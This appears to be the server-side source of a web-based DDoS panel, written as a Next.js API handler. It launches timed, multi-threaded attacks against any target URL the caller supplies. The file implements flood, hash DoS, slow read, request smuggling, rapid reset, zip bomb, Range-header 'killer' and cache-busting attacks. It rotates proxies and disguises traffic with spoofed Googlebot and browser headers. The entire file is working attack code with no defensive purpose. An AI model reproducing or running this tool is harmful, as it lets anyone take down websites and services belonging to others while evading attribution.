import { HttpsProxyAgent } from 'https-proxy-agent'

export const config = {
  api: {
    bodyParser: true,
    responseLimit: false,
  },
}

// ========== Random helpers ==========
function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}
function randomChoice(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

const commonUserAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
]

const googlebotUserAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

const acceptEncodings = ["gzip, deflate, br", "gzip, deflate", "br, gzip, deflate", "*"]
const acceptLanguages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9,en;q=0.8"]
const referers = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", ""]
const cacheControl = ["no-cache", "max-age=0", "no-store"]

function buildRequest(host, path, method, extraHeaders = {}, body = null) {
  const useGooglebot = Math.random() < 0.3
  const headers = {
    'Host': host,
    'User-Agent': useGooglebot ? randomChoice(googlebotUserAgents) : randomChoice(commonUserAgents),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': randomChoice(acceptLanguages),
    'Accept-Encoding': randomChoice(acceptEncodings),
    'Connection': 'keep-alive',
    'Cache-Control': randomChoice(cacheControl),
    ...extraHeaders
  }
  const ref = randomChoice(referers)
  if (ref) headers['Referer'] = ref

  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000000, 9999999)

  const fetchOptions = { method, headers }
  if (body) {
    fetchOptions.body = body
    if (!headers['Content-Type']) headers['Content-Type'] = 'application/x-www-form-urlencoded'
  }

  return { url: `https://${host}${finalPath}`, options: fetchOptions }
}

// ========== Attacker functions ==========
async function makeRequest(target, proxyAgent, reqBuilder) {
  const proto = target.startsWith('https') ? 'https' : 'http'
  const urlObj = new URL(target)
  const host = urlObj.host
  const path = urlObj.pathname + urlObj.search || '/'

  const { url, options } = reqBuilder(host, path)
  if (proxyAgent) options.agent = proxyAgent

  try {
    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 15000)
    options.signal = controller.signal
    const response = await fetch(url, options)
    clearTimeout(timeout)
    await response.text()
    return { success: true, status: response.status }
  } catch (err) {
    return { success: false, error: err.message }
  }
}

async function hashDosRequest(target, proxyAgent) {
  const urlObj = new URL(target)
  const host = urlObj.host
  const params = []
  for (let i = 0; i < 1000; i++) params.push(`a[]=${i}`)
  const body = params.join('&')
  const url = `${target.startsWith('https') ? 'https' : 'http'}://${host}/login?rand=${randomInt(1000,9999)}`
  const options = {
    method: 'POST',
    headers: {
      'Host': host,
      'User-Agent': randomChoice(commonUserAgents),
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': body.length.toString(),
    },
    body,
  }
  if (proxyAgent) options.agent = proxyAgent
  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 15000)
    options.signal = controller.signal
    await fetch(url, options)
    return { success: true }
  } catch (err) {
    return { success: false, error: err.message }
  }
}

async function slowReadRequest(target, proxyAgent) {
  const proto = target.startsWith('https') ? 'https' : 'http'
  const urlObj = new URL(target)
  const host = urlObj.host
  const path = urlObj.pathname || '/'
  const url = `${proto}://${host}${path}?rand=${randomInt(1000,9999)}`
  const options = {
    method: 'GET',
    headers: {
      'Host': host,
      'User-Agent': randomChoice(commonUserAgents),
      'Connection': 'keep-alive',
    },
  }
  if (proxyAgent) options.agent = proxyAgent
  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 30000)
    options.signal = controller.signal
    const response = await fetch(url, options)
    const reader = response.body.getReader()
    let bytesRead = 0
    while (true) {
      const { done, value } = await reader.read()
      if (done) break
      bytesRead += value.length
      await new Promise(resolve => setTimeout(resolve, 100))
      if (bytesRead > 1000) break
    }
    reader.cancel()
    return { success: true }
  } catch {
    return { success: false }
  }
}

async function rapidResetRequest(target, proxyAgent) {
  const proto = target.startsWith('https') ? 'https' : 'http'
  const urlObj = new URL(target)
  const host = urlObj.host
  const url = `${proto}://${host}/?rand=${randomInt(1000,9999)}`
  const controller = new AbortController()
  setTimeout(() => controller.abort(), 50)
  try {
    const options = {
      method: 'GET',
      headers: { 'Host': host, 'User-Agent': randomChoice(commonUserAgents) },
      signal: controller.signal,
    }
    if (proxyAgent) options.agent = proxyAgent
    await fetch(url, options)
    return { success: true }
  } catch {
    return { success: true } // abort masih dihitung sukses mengirim request
  }
}

function generateZipBomb() {
  try {
    const { deflateSync } = require('zlib')
    const data = Buffer.alloc(10 * 1024 * 1024, 'A')
    return deflateSync(data).toString('base64')
  } catch {
    return null
  }
}
const zipBombPayload = generateZipBomb()

async function sendZipBomb(target, proxyAgent) {
  if (!zipBombPayload) return { success: false, error: 'Failed to generate zip bomb' }
  const urlObj = new URL(target)
  const host = urlObj.host
  const url = `${target.startsWith('https') ? 'https' : 'http'}://${host}/upload?rand=${randomInt(1000,9999)}`
  const body = Buffer.from(zipBombPayload, 'base64')
  const options = {
    method: 'POST',
    headers: {
      'Host': host,
      'User-Agent': randomChoice(commonUserAgents),
      'Content-Encoding': 'gzip',
      'Content-Type': 'application/octet-stream',
      'Content-Length': body.length.toString(),
    },
    body,
  }
  if (proxyAgent) options.agent = proxyAgent
  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 30000)
    options.signal = controller.signal
    await fetch(url, options)
    return { success: true }
  } catch {
    return { success: false }
  }
}

function apacheKillerReq(host, path) {
  const ranges = []
  for (let i = 0; i < 20; i++) {
    const start = randomInt(0, 5000)
    const end = start + randomInt(100, 500)
    ranges.push(`${start}-${end}`)
  }
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${host}${finalPath}`,
    options: {
      method: 'GET',
      headers: {
        'Host': host,
        'User-Agent': randomChoice(commonUserAgents),
        'Range': `bytes=${ranges.join(',')}`,
        'Connection': 'keep-alive',
      },
    },
  }
}

function nginxKillerReq(host, path) {
  const ranges = []
  for (let i = 0; i < 40; i++) {
    const start = randomInt(0, 5000)
    const end = start + randomInt(100, 1000)
    ranges.push(`${start}-${end}`)
  }
  const longHost = host + 'a'.repeat(randomInt(500, 2000))
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${host}${finalPath}`,
    options: {
      method: 'GET',
      headers: {
        'Host': longHost,
        'User-Agent': randomChoice(commonUserAgents),
        'Range': `bytes=${ranges.join(',')}`,
        'Connection': 'keep-alive',
      },
    },
  }
}

function cachePoisonReq(host, path) {
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${host}${finalPath}`,
    options: {
      method: 'GET',
      headers: {
        'Host': host,
        'User-Agent': randomChoice(commonUserAgents),
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'X-Forwarded-For': `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`,
      },
    },
  }
}

function originBypassReq(targetIP, host, path) {
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${targetIP}${finalPath}`,
    options: {
      method: 'GET',
      headers: {
        'Host': host,
        'User-Agent': randomChoice(commonUserAgents),
      },
    },
  }
}

async function pipelineRequest(target, proxyAgent) {
  const urlObj = new URL(target)
  const host = urlObj.host
  for (let i = 0; i < 3; i++) {
    const { url, options } = buildRequest(host, urlObj.pathname, 'GET')
    if (proxyAgent) options.agent = proxyAgent
    try {
      const controller = new AbortController()
      setTimeout(() => controller.abort(), 5000)
      options.signal = controller.signal
      await fetch(url, options)
    } catch {}
  }
  return { success: true }
}

// ========== Main handler ==========
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' })
  }

  const { target, method: attackMethod, httpMethod, threads, duration, proxies } = req.body

  if (!target) {
    return res.status(400).json({ error: 'Target required' })
  }

  let targetUrl
  try {
    targetUrl = new URL(target)
  } catch {
    return res.status(400).json({ error: 'Invalid URL' })
  }

  const useProxy = proxies && proxies.length > 0
  let proxyIndex = 0

  res.setHeader('Content-Type', 'text/plain; charset=utf-8')
  res.setHeader('Transfer-Encoding', 'chunked')
  res.setHeader('X-Content-Type-Options', 'nosniff')

  const startTime = Date.now()
  const endTime = startTime + (duration * 1000)
  let total = 0
  let success = 0
  let failed = 0

  const sendStats = () => {
    const elapsed = (Date.now() - startTime) / 1000
    const rps = elapsed > 0 ? Math.round(total / elapsed) : 0
    res.write(`data:${JSON.stringify({ total, success, failed, rps, elapsed: Math.round(elapsed) })}\n\n`)
  }

  async function worker() {
    while (Date.now() < endTime) {
      let proxyAgent = null
      if (useProxy) {
        const proxy = proxies[proxyIndex % proxies.length]
        proxyIndex++
        try {
          proxyAgent = new HttpsProxyAgent(proxy)
        } catch {}
      }

      let result

      switch (attackMethod) {
        case 'flood':
          result = await makeRequest(target, proxyAgent, buildRequest)
          break
        case 'hashdos':
          result = await hashDosRequest(target, proxyAgent)
          break
        case 'slowread':
          result = await slowReadRequest(target, proxyAgent)
          break
        case 'smuggle': {
          const urlObj = new URL(target)
          const host = urlObj.host
          const path = urlObj.pathname || '/'
          const finalPath = path + '?rand=' + randomInt(1000,9999)
          const smuggledBody = '0\r\n\r\nSMUGGLED'
          const smuggleReq = {
            url: `https://${host}${finalPath}`,
            options: {
              method: 'POST',
              headers: {
                'Host': host,
                'User-Agent': randomChoice(commonUserAgents),
                'Transfer-Encoding': 'chunked',
                'Content-Length': smuggledBody.length.toString(),
              },
              body: smuggledBody,
            },
          }
          if (proxyAgent) smuggleReq.options.agent = proxyAgent
          try {
            await fetch(smuggleReq.url, smuggleReq.options)
            result = { success: true }
          } catch {
            result = { success: false }
          }
          break
        }
        case 'paretoflood': {
          const burst = randomInt(1, 10)
          for (let i = 0; i < burst && Date.now() < endTime; i++) {
            const r = await makeRequest(target, proxyAgent, buildRequest)
            if (r.success) success++
            else failed++
            total++
          }
          await new Promise(resolve => setTimeout(resolve, randomInt(50, 200)))
          continue
        }
        case 'zipbomb':
          result = await sendZipBomb(target, proxyAgent)
          break
        case 'rapidreset':
          result = await rapidResetRequest(target, proxyAgent)
          break
        case 'pipeline':
          result = await pipelineRequest(target, proxyAgent)
          break
        case 'originbypass': {
          const urlObj = new URL(target)
          const host = urlObj.host
          const path = urlObj.pathname || '/'
          const originIP = target.replace(/https?:\/\//, '').split('/')[0].split(':')[0]
          const { url, options } = originBypassReq(originIP, host, path)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch {
            result = { success: false }
          }
          break
        }
        case 'tlsflood': {
          const urlObj = new URL(target)
          const host = urlObj.host
          const options = { method: 'GET', headers: { 'Host': host } }
          if (proxyAgent) options.agent = proxyAgent
          try {
            const controller = new AbortController()
            setTimeout(() => controller.abort(), 2000)
            options.signal = controller.signal
            await fetch(`https://${host}/?rand=${randomInt(1000,9999)}`, options)
            result = { success: true }
          } catch {
            result = { success: true }
          }
          break
        }
        case 'cachepoison': {
          const urlObj = new URL(target)
          const { url, options } = cachePoisonReq(urlObj.host, urlObj.pathname)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch {
            result = { success: false }
          }
          break
        }
        case 'apachekiller': {
          const urlObj = new URL(target)
          const { url, options } = apacheKillerReq(urlObj.host, urlObj.pathname)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch {
            result = { success: false }
          }
          break
        }
        case 'nginxkiller': {
          const urlObj = new URL(target)
          const { url, options } = nginxKillerReq(urlObj.host, urlObj.pathname)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch {
            result = { success: false }
          }
          break
        }
        case 'randombrowser':
          result = await makeRequest(target, proxyAgent, buildRequest)
          break
        case 'multivector': {
          const methods = ['flood', 'hashdos', 'rapidreset', 'nginxkiller', 'tlsflood']
          const chosen = methods[Math.floor(Math.random() * methods.length)]
          switch (chosen) {
            case 'flood': result = await makeRequest(target, proxyAgent, buildRequest); break
            case 'hashdos': result = await hashDosRequest(target, proxyAgent); break
            case 'rapidreset': result = await rapidResetRequest(target, proxyAgent); break
            case 'nginxkiller': {
              const urlObj = new URL(target)
              const { url, options } = nginxKillerReq(urlObj.host, urlObj.pathname)
              try { await fetch(url, options); result = { success: true } } catch { result = { success: false } }
              break
            }
            case 'tlsflood': {
              const urlObj = new URL(target)
              const host = urlObj.host
              try { await fetch(`https://${host}/?rand=${randomInt(1000,9999)}`, {signal: (()=>{const c=new AbortController();setTimeout(()=>c.abort(),2000);return c.signal})()}); result = { success: true } } catch { result = { success: true } }
              break
            }
          }
          break
        }
        default:
          result = await makeRequest(target, proxyAgent, buildRequest)
      }

      if (result && result.success) success++
      else failed++
      total++

      if (total % 10 === 0) sendStats()
      await new Promise(resolve => setTimeout(resolve, 10))
    }
  }

  const workers = []
  for (let i = 0; i < threads; i++) {
    workers.push(worker())
  }

  const statsInterval = setInterval(sendStats, 1000)

  await Promise.all(workers)
  clearInterval(statsInterval)

  sendStats()
  res.write(`data:${JSON.stringify({ total, success, failed, duration: Math.round((Date.now() - startTime) / 1000), final: true })}\n\n`)
  res.end()
}
